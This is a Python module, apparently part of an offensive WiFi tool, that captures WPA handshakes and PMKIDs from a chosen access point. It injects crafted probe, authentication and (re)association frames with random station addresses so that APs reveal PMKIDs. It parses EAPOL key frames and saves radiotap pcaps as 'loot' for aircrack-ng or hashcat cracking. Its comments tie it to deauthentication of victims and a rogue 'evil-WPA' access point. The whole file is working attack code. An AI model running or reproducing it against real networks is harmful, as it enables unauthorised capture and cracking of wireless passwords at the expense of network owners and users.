"""Stage-4 payload: WPA handshake / PMKID capture.

Watches the monitor interface on the target channel and picks 802.11 EAPOL
key frames out of the air. When a usable 4-way exchange (Msg1+Msg2 or
Msg2+Msg3) or a PMKID element is seen, the sighting is indexed into the loot
(handshakes.json) and the raw 802.1X traffic is written to loot/pcaps/.

Two capture paths run together, exactly like pwnagotchi/bettercap:

  * passive   — deauth makes the real client reassociate to the real AP and
                we record M1..M4 plus the target's beacons.
  * PMKID     — a crafted (re)association request with a random station MAC
                and an RSN PMKID list is injected on the target channel. Many
                APs answer with EAPOL M1 carrying their PMKID before any
                credential is verified, so a client-less AP is still lootable.

Nothing is exfiltrated — everything stays on-device in the loot tree. The
pcap is written by us (not tcpdump) with DLT_IEEE802_11_RADIO so aircrack-ng
and hcxpcapngtool both read the monitor-mode frames correctly; the old
`ether proto 0x888e` tcpdump filter matched nothing on a radiotap link.
"""

import os
import socket
import struct
import threading
import time

from . import config
from . import linuxutil
from . import state

RSN_PMKID = bytes.fromhex('000fac04')
DLT_IEEE802_11_RADIO = 127

# Radiotap: version 0, length 10, present = FLAGS|RATE, flags 0, rate 2 Mb/s.
# Same minimal header karma.py uses for probe-response injection.
_RADIOTAP_TX = bytes([0x00, 0x00, 0x0A, 0x00, 0x06, 0x00, 0x00, 0x00,
                      0x00, 0x04])

# Supported / extended supported rates advertised by the PMKID probe.
_RATES = bytes([0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24])
_XRATES = bytes([0x30, 0x48, 0x60, 0x6c])


def unique_pcap_path():
    """Fresh loot/pcaps path that never collides within the same second.

    A quick disarm/re-arm in the same second used to reuse one filename and
    overwrite the previous (possibly crackable) capture.
    """
    try:
        os.makedirs(config.PCAP_DIR, exist_ok=True)
    except OSError:
        pass
    base = 'malstrom-%s' % time.strftime('%Y%m%d-%H%M%S')
    n = 0
    while True:
        name = '%s.pcap' % base if not n else '%s-%d.pcap' % (base, n)
        path = os.path.join(config.PCAP_DIR, name)
        if not os.path.exists(path):
            return path
        n += 1


def _mac(b):
    return ':'.join('%02x' % x for x in b).upper()


class CaptureEngine(object):
    def __init__(self):
        self._stop = threading.Event()
        self._thread = None
        self._lock = threading.Lock()
        self._pcap_lock = threading.Lock()
        self._cmd = {'active': False, 'bssid': '', 'ssid': '',
                     'channel': None, 'mode': 'off', 'rogue_bssid': ''}
        self._pairs = {}
        self._indexed = set()
        self._pcap_fh = None
        self._pcap_file = None
        self._pcap_announced = False
        self._mon = None
        self._no_mon_warned = False
        self._verify = None
        self._last_chan = {}
        self._seq = 0
        self._last_assoc = 0.0
        self._assoc_target = ''
        self._assoc_sent = 0
        self._inject_warned = False

    def set_verifier(self, verify):
        """Hook the post-capture validity verifier (verify.VerifyEngine)."""
        self._verify = verify

    def _monitor(self):
        """Resolve monitor vif, caching only a usable result (see deauth)."""
        if self._mon:
            return self._mon
        mon = linuxutil.ensure_monitor_iface()
        if mon:
            self._mon = mon
        return mon

    def set_cmd(self, **kw):
        with self._lock:
            self._cmd.update(kw)

    def current_cmd(self):
        with self._lock:
            return dict(self._cmd)

    # --- lifecycle ---------------------------------------------------------
    def start(self):
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None
        self._close_pcap()
        self._reset_session()

    # --- sniffing loop ------------------------------------------------------
    def _run(self):
        while not self._stop.is_set():
            try:
                self._cycle()
            except Exception as exc:
                state.emit('ALERT', 'capture engine: %s' % exc)
            self._stop.wait(1.0)

    def _capturing(self):
        cmd = self.current_cmd()
        return bool(cmd['active'] and cmd['mode'] in
                    ('handshake', 'pmkid', 'both'))

    def _reset_session(self):
        self._pairs.clear()
        self._indexed.clear()
        self._pcap_announced = False
        self._assoc_target = ''
        self._last_assoc = 0.0

    def _set_mon_channel(self, mon, channel):
        """Tune the monitor vif, skipping redundant calls (see deauth).

        Repeated `iw dev X set channel` on cheap USB dongles stalls the driver
        for hundreds of ms each — the same path that wedged the radio stack
        mid-attack. Only toggle the channel when it actually moved.
        """
        channel = str(channel)
        if self._last_chan.get(mon) == channel:
            return False
        if linuxutil.set_channel(mon, channel):
            self._last_chan[mon] = channel
        return True

    def _cycle(self):
        if not self._capturing():
            self._close_pcap()
            self._reset_session()
            self._stop.wait(2.0)
            return

        mon = self._monitor()
        if not mon:
            if not self._no_mon_warned:
                state.emit('ALERT', 'capture: no monitor interface available')
                self._no_mon_warned = True
            return
        ch = self.current_cmd().get('channel')
        if ch:
            self._set_mon_channel(mon, ch)

        sock = None
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                 socket.htons(0x0003))
            sock.bind((mon, 0))
            sock.settimeout(1)
        except OSError:
            if not self._no_mon_warned:
                state.emit('ALERT', 'capture: cannot bind %s' % mon)
                self._no_mon_warned = True
            return

        self._open_pcap(mon)
        last_tune = 0.0
        while not self._stop.is_set() and self._capturing():
            # re-tune at most once per second so an operator channel change is
            # honored without the set_channel storm that wedges USB radios
            now = time.time()
            if now - last_tune >= 1.0:
                ch = self.current_cmd().get('channel')
                if ch:
                    self._set_mon_channel(mon, ch)
                last_tune = now
            # a successful capture seals its pcap for immediate verification;
            # start a fresh file for the rest of the session
            if self._pcap_fh is None:
                self._open_pcap(mon)
            self._maybe_assoc(sock, mon)
            try:
                data = sock.recv(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                self._ingest(data)
            except (struct.error, IndexError, ValueError):
                continue
        sock.close()

    # --- pcap recording ------------------------------------------------------
    def _open_pcap(self, mon):
        with self._pcap_lock:
            if self._pcap_fh is not None:
                return
            try:
                os.makedirs(config.PCAP_DIR, exist_ok=True)
                path = unique_pcap_path()
                fh = open(path, 'wb')
                # pcap global header, linktype = radiotap + 802.11
                fh.write(struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0,
                                     65535, DLT_IEEE802_11_RADIO))
                fh.flush()
            except (OSError, ValueError):
                self._pcap_fh = None
                return
            self._pcap_fh = fh
            self._pcap_file = path
            if not self._pcap_announced:
                self._pcap_announced = True
                state.emit('INFO', 'payload capture: writing %s' % path)

    def _write_pcap(self, data, ts=None):
        if not data:
            return
        with self._pcap_lock:
            fh = self._pcap_fh
            if fh is None:
                return
            if ts is None:
                ts = time.time()
            sec = int(ts)
            usec = int((ts - sec) * 1000000)
            n = len(data)
            try:
                fh.write(struct.pack('<IIII', sec, usec, n, n))
                fh.write(data)
                fh.flush()
            except (OSError, ValueError):
                self._pcap_fh = None
                try:
                    fh.close()
                except OSError:
                    pass

    def _close_pcap(self):
        with self._pcap_lock:
            fh = self._pcap_fh
            self._pcap_fh = None
            if fh is not None:
                try:
                    fh.flush()
                    fh.close()
                except OSError:
                    pass
            path = self._pcap_file
            self._pcap_file = None
        if path:
            state.emit('INFO', 'payload capture closed: %s' % path)
            if self._verify:
                self._verify.enqueue(path)

    # --- frame helpers -------------------------------------------------------
    @staticmethod
    def _frame_info(data):
        """Return radiotap/802.11 metadata for one monitor-mode frame."""
        if len(data) < 4:
            return None
        try:
            rt_len = struct.unpack('<H', data[2:4])[0]
        except struct.error:
            return None
        if rt_len < 4 or rt_len > len(data) - 10:
            return None
        w = data[rt_len:]
        if len(w) < 24:
            return None
        fc = struct.unpack('<H', w[0:2])[0]
        ftype = (fc >> 2) & 3
        subtype = (fc >> 4) & 0x0F
        hdr = 24
        if ftype == 2:
            if ((fc >> 8) & 3) == 3:       # WDS: fourth address field
                hdr += 6
            if subtype in (8, 9, 10, 11, 12, 13, 14, 15):
                hdr += 2                   # QoS control
            if fc & 0x8000:
                hdr += 4                   # HT control (order bit)
        if len(w) < hdr:
            return None
        return {
            'rt_len': rt_len,
            'hdr_end': rt_len + hdr,
            'ftype': ftype,
            'subtype': subtype,
            'a1': _mac(w[4:10]),
            'a2': _mac(w[10:16]),
            'a3': _mac(w[16:22]),
        }

    # --- EAPOL parsing -------------------------------------------------------
    def _parse_eapol(self, data, hdr_end):
        """Return (msg_type, key_data) from a data frame body, or None.

        EAPOL rides LLC/SNAP + ethertype 0x888e after the 802.11 header, so a
        real frame looks like: [.. 802.11 ..] [aa aa 03 00 00 00] [88 8e]
        [ver type length] [EAPOL-Key ...]. The ethertype is what `find` locates;
        everything after it is the 802.1X envelope.
        """
        idx = data.find(b'\x88\x8e', hdr_end)
        if idx < hdr_end:
            return None
        try:
            if data[idx + 3] != 3:          # 802.1X type 3 == EAPOL-Key
                return None
            if data[idx + 6] not in (1, 2):  # 1 == WPA, 2 == RSN
                return None
            key_info = struct.unpack('>H', data[idx + 7:idx + 9])[0]
            ack = bool(key_info & 0x0080)
            mic = bool(key_info & 0x0100)
            secure = bool(key_info & 0x0200)
            if ack and not mic:
                mtype = 1
            elif ack and mic:
                mtype = 3
            elif mic and secure:
                mtype = 4           # M4 has MIC + Secure, no ACK
            elif mic:
                mtype = 2
            else:
                mtype = 4
            klen = struct.unpack('>H', data[idx + 99:idx + 101])[0]
            kdata = data[idx + 101:idx + 101 + klen]
            return mtype, kdata
        except (struct.error, IndexError, ValueError):
            return None

    def _ingest(self, data):
        info = self._frame_info(data)
        if not info:
            return
        cmd = self.current_cmd()
        tbssid = (cmd.get('bssid') or '').upper()
        rogue = (cmd.get('rogue_bssid') or '').upper()

        if info['ftype'] == 2:
            parsed = self._parse_eapol(data, info['hdr_end'])
            if not parsed:
                return
            mtype, kdata = parsed
            # BSSID attribution: Msg1/3 are transmitted by the AP (addr2 =
            # AP), Msg2/4 are sent by the client to the AP (addr1 = AP).
            if mtype in (1, 3):
                ap, sta = info['a2'], info['a1']
            else:
                ap, sta = info['a1'], info['a2']

            if rogue and (ap == rogue or sta == rogue):
                # EAPOL with our own evil-WPA AP (either direction) — known PSK.
                return
            if tbssid and tbssid not in (ap, sta):
                return

            # Record every EAPOL frame of the target immediately: a handshake
            # is only as good as the pcap bytes that were on disk at the time.
            self._write_pcap(data)

            key = tuple(sorted((ap, sta)))
            if key not in self._pairs:
                self._pairs[key] = {'msg': set(), 'pmkid': False}
                if len(self._pairs) > 128:     # bound the window
                    self._pairs.pop(next(iter(self._pairs)))
            ps = self._pairs[key]
            ps['msg'].add(mtype)
            if mtype in (1, 3) and RSN_PMKID in kdata:
                ps['pmkid'] = True

            if key in self._indexed:
                return
            # M1+M2 is the classic pair; M2+M3 is equally crackable and often
            # the only pair a fast reassociation leaves behind.
            hs = (2 in ps['msg']) and (bool({1, 3} & ps['msg']))
            pm = ps['pmkid']
            if not (hs or pm):
                return
            self._indexed.add(key)
            if len(self._indexed) > 256:
                self._indexed = set(list(self._indexed)[-128:])
            kind = 'both' if (hs and pm) else ('handshake' if hs else 'pmkid')
            state.index_handshake({
                'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
                'bssid': ap,
                'ssid': cmd.get('ssid', ''),
                'client': sta,
                'kind': kind,
                'file': self._pcap_file or '',
            })
            state.upsert_device(sta)
            self._auto_shield_sta(sta, kind)
            state.mirror_loot()
            state.emit('HANDSHAKE' if kind != 'pmkid' else 'PMKID',
                       '%s for %s (%s) — %s' % (
                           kind.capitalize(), ap, cmd.get('ssid', '?'),
                           self._pcap_file or 'no pcap'))
            # seal this file so verify + 22000 export see a complete capture
            self._close_pcap()
            return

        # Management context: beacons/probe responses (SSID + RSN IE) and the
        # association exchange are required by hcxpcapngtool to build a
        # hashcat 22000 line, so record them for the target BSSID only.
        if info['ftype'] != 0 or not tbssid:
            return
        if rogue and info['a3'] == rogue:
            return
        if info['subtype'] in (5, 8):
            if info['a3'] == tbssid:
                self._write_pcap(data)
        elif info['subtype'] in (0, 1, 2, 3, 11):
            if info['a1'] == tbssid or info['a3'] == tbssid:
                self._write_pcap(data)

    # --- active PMKID probe --------------------------------------------------
    @staticmethod
    def _random_sta():
        b = bytearray(os.urandom(6))
        b[0] = 0x02                    # locally administered, unicast
        return _mac(b)

    def _auth_frame(self, bssid, sta):
        """Open-system authentication (required before association on most APs)."""
        ap = bytes.fromhex(bssid.replace(':', ''))
        st = bytes.fromhex(sta.replace(':', ''))
        if len(ap) != 6 or len(st) != 6:
            raise ValueError('bad mac')
        self._seq = (self._seq + 1) & 0x0FFF
        hdr = struct.pack('<HH', 0x00B0, 0)          # auth, no flags
        hdr += ap + st + ap
        hdr += struct.pack('<H', self._seq << 4)
        body = struct.pack('<HHH', 0, 1, 0)          # open, seq 1, status success
        return _RADIOTAP_TX + hdr + body

    def _probe_frame(self, ssid, sta):
        st = bytes.fromhex(sta.replace(':', ''))
        if len(st) != 6:
            raise ValueError('bad mac')
        self._seq = (self._seq + 1) & 0x0FFF
        hdr = struct.pack('<HH', 0x0040, 0)
        hdr += b'\xff' * 6 + st + b'\xff' * 6
        hdr += struct.pack('<H', self._seq << 4)
        ssid_b = (ssid or '').encode('utf-8', 'replace')[:32]
        body = bytes([0, len(ssid_b)]) + ssid_b
        body += bytes([1, len(_RATES)]) + _RATES
        return _RADIOTAP_TX + hdr + body

    def _reassoc_frame(self, bssid, ssid, sta):
        ap = bytes.fromhex(bssid.replace(':', ''))
        st = bytes.fromhex(sta.replace(':', ''))
        if len(ap) != 6 or len(st) != 6:
            raise ValueError('bad mac')
        self._seq = (self._seq + 1) & 0x0FFF
        hdr = struct.pack('<HH', 0x0020, 0)          # reassoc request
        hdr += ap + st + ap
        hdr += struct.pack('<H', self._seq << 4)
        ssid_b = (ssid or '').encode('utf-8', 'replace')[:32]
        body = struct.pack('<H', 0x0431)
        body += struct.pack('<H', 10)
        body += b'\x00' * 6                          # current AP
        body += bytes([0, len(ssid_b)]) + ssid_b
        body += bytes([1, len(_RATES)]) + _RATES
        body += bytes([50, len(_XRATES)]) + _XRATES
        rsn = (b'\x01\x00'
               + bytes.fromhex('000fac04')
               + b'\x02\x00'
               + bytes.fromhex('000fac04')
               + bytes.fromhex('000fac02')
               + b'\x01\x00'
               + bytes.fromhex('000fac02')
               + b'\x00\x00'
               + b'\x01\x00' + os.urandom(16))       # PMKID list
        body += bytes([48, len(rsn)]) + rsn
        return _RADIOTAP_TX + hdr + body

    def _assoc_frame(self, bssid, ssid, sta):
        """Craft an association request carrying an RSN PMKID list.

        The AP has its own PSK, so it can compute a PMKID for any station; a
        fair number of implementations put that PMKID in EAPOL M1 before the
        client is authenticated. Asking for PMKSA caching (random PMKID) is
        what makes them volunteer it.
        """
        ap = bytes.fromhex(bssid.replace(':', ''))
        st = bytes.fromhex(sta.replace(':', ''))
        if len(ap) != 6 or len(st) != 6:
            raise ValueError('bad mac')
        self._seq = (self._seq + 1) & 0x0FFF
        hdr = struct.pack('<HH', 0x0000, 0)          # assoc request, no flags
        hdr += ap + st + ap                          # DA / SA / BSSID
        hdr += struct.pack('<H', self._seq << 4)
        ssid_b = (ssid or '').encode('utf-8', 'replace')[:32]
        body = struct.pack('<H', 0x0431)             # ESS|Privacy|ShortSlot
        body += struct.pack('<H', 10)                # listen interval
        body += bytes([0, len(ssid_b)]) + ssid_b
        body += bytes([1, len(_RATES)]) + _RATES
        body += bytes([50, len(_XRATES)]) + _XRATES
        pmkid = os.urandom(16)
        rsn = (b'\x01\x00'                           # RSN version 1
               + bytes.fromhex('000fac04')           # group: CCMP
               + b'\x02\x00'                         # pairwise count 2
               + bytes.fromhex('000fac04')           # CCMP
               + bytes.fromhex('000fac02')           # TKIP
               + b'\x01\x00'                         # AKM count 1
               + bytes.fromhex('000fac02')           # PSK
               + b'\x00\x00'                         # RSN capabilities
               + b'\x01\x00' + pmkid)                # PMKID list: one
        body += bytes([48, len(rsn)]) + rsn
        return _RADIOTAP_TX + hdr + body

    def _maybe_assoc(self, sock, mon):
        if not config.PMKID_PROBE:
            return
        cmd = self.current_cmd()
        if cmd.get('mode') not in ('pmkid', 'both'):
            return
        bssid = (cmd.get('bssid') or '').strip().upper()
        ssid = (cmd.get('ssid') or '').strip()
        if not bssid or not ssid:
            return
        now = time.time()
        interval = max(2.0, float(config.PMKID_INTERVAL))
        if now - self._last_assoc < interval:
            return
        self._last_assoc = now
        ch = cmd.get('channel')
        if ch:
            self._set_mon_channel(mon, ch)
        sent = 0
        for _ in range(max(1, int(config.PMKID_TRIES))):
            if self._stop.is_set():
                break
            sta = self._random_sta()
            try:
                probe = self._probe_frame(ssid, sta)
                auth = self._auth_frame(bssid, sta)
                assoc = self._assoc_frame(bssid, ssid, sta)
                reassoc = self._reassoc_frame(bssid, ssid, sta)
            except (ValueError, struct.error):
                return
            try:
                for fr in (probe, auth, assoc, reassoc):
                    sock.send(fr)
                    self._write_pcap(fr)
                    time.sleep(0.03)
                sent += 1
            except OSError:
                break
        if sent:
            self._assoc_sent += sent
            if bssid != self._assoc_target:
                self._assoc_target = bssid
                state.emit('INFO', 'pmkid: active association probe → %s (%s)'
                           % (bssid, ssid or '?'))
        elif not self._inject_warned:
            self._inject_warned = True
            state.emit('ALERT',
                       'pmkid: association-request injection failed on %s — '
                       'driver may not support monitor-mode TX' % mon)

    def _auto_shield_sta(self, sta, kind):
        """Stop deauthing a client the moment its handshake is in the vault.

        A MAC shield (unlike the captured-client IP shields) survives
        re-arming, so a victim whose capture already landed is never hammered
        again on a fresh engagement. Honors the shield-after-capture toggle;
        failures never break the capture path.
        """
        if not sta:
            return
        try:
            if not state.load_state().get('shield_after_capture'):
                return
            if sta.upper() in {e.upper() for e in state.read_whitelist()}:
                return
            state.add_whitelist(sta)
        except Exception:
            return
        state.emit('INFO', 'auto-shielded %s — %s captured, deauth stops '
                           'for this client' % (sta, kind))
